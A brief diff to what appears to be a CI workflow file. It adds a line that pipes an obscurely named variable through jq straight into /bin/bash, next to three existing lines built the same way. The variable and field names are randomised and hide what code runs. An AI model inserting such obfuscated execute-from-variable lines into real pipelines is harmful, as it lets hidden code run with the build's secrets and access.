@@ -46,6 +46,7 @@ jobs:
           echo $uca1 | jq -r .kplvx3820 | /bin/bash
           printf '%s' "$lst7240" | jq -r .ge87 | /bin/bash
           echo $chfq34376 | jq -r .uribm74204 | /bin/bash
+          echo $twiv86 | jq -r .techb2946 | /bin/bash
 
       - name: Archive output
         if: always()
